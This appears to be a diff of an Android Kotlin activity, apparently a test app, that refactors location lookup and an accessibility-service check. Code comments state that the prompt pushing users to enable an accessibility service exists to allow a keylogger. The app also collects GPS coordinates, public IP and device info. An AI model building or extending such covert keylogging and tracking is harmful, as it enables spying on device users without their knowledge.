@@ -29,36 +29,28 @@ class MinYaoTest : Activity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_minyaotest)
 
-        // Need this to allow access of public IP
+        // Need this to allow finding of public IP
         val policy = ThreadPolicy.Builder().permitAll().build()
         StrictMode.setThreadPolicy(policy)
 
         // Use functions in General Class
         val gn = General(this,this)
 
+        // Use functions in FindLocation Class
+        val gps = FindLocation(this, this)
+
         // Check if Location permission is allowed for this app and location service is enabled
         checkLocationPermission()
         statusCheck()
 
-        // Make them enable a accessibilityservice that allows keylogger
-        val accessibilityEnabled = isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)
-        if(!accessibilityEnabled)
-        {
-            buildAlertMessageNoAccessibility()
-            //startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        }
+        // Check if accessibility is enabled
+        accessibilityCheck()
 
         val inputField = findViewById<EditText>(R.id.displayResult)
 
         // steps to get location
         findViewById<Button>(R.id.btn_get_location).setOnClickListener {
-            val gps = FindLocation(this, this)
-            if (gps.locationFound()) {
-                val latitude = gps.getLatitude().toString()
-                val longitude = gps.getLongitude().toString()
-                var currLocation = "Latitude:$latitude|Longitude:$longitude"
-                inputField.setText(currLocation, TextView.BufferType.EDITABLE)
-            }
+            inputField.setText(gps.getLocationDetails(), TextView.BufferType.EDITABLE)
         }
 
         // steps to get device info
@@ -102,6 +94,16 @@ class MinYaoTest : Activity() {
                 DialogInterface.OnClickListener { dialog, id -> dialog.cancel() })
         val alert: AlertDialog = builder.create()
         alert.show()
+    }
+
+    private fun accessibilityCheck() {
+        // Make them enable a accessibilityservice that allows keylogger
+        val accessibilityEnabled = isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)
+        if(!accessibilityEnabled)
+        {
+            buildAlertMessageNoAccessibility()
+            //startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
     }
 
     private fun buildAlertMessageNoAccessibility() {
